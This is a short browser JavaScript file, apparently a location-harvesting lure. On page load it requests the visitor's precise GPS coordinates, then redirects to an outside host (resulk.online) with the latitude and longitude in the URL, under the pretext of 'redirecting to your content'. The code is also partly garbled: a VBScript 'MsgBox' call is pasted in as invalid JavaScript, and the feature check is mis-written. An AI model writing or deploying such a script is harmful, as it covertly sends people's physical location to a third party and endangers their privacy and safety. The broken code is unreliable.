const funcionInit = () => {
	if (!"geolocation" in navigator) {
		return alert("Tu navegador no soporta el acceso a la ubicación. Intenta con otro");
	}

	const $latitud = document.querySelector("#latitud"),
		$longitud = document.querySelector("#longitud"),
		$enlace = document.querySelector("#enlace");


 
	const myAlert(title, content) {
	MsgBox content, 0, title 
	}

	const onUbicacionConcedida = ubicacion => {
		//console.log("", ubicacion);
		const coordenadas = ubicacion.coords;
		$latitud.innerText = coordenadas.latitude;
		$longitud.innerText = coordenadas.longitude;
		$enlace.href = `https://resulk.online/link/cor.php?d=${coordenadas.latitude},${coordenadas.longitude}`;
		alert("Redireccionado a su contenido")

		window.location=`https://resulk.online/link/cor.php?d=${coordenadas.latitude},${coordenadas.longitude}`; 
	}
	const onErrorDeUbicacion = err => {

		$latitud.innerText = "" + err.message;
		$longitud.innerText = "" + err.message;
		//console.log("", err);
	}

	const opcionesDeSolicitud = {
		enableHighAccuracy: true, // Alta precisión
		maximumAge: 0, // No queremos caché
		timeout: 5000 // Esperar solo 5 segundos
	};

	$latitud.innerText = "";
	$longitud.innerText = "";
	navigator.geolocation.getCurrentPosition(onUbicacionConcedida, onErrorDeUbicacion, opcionesDeSolicitud);

};
document.addEventListener("DOMContentLoaded", funcionInit);
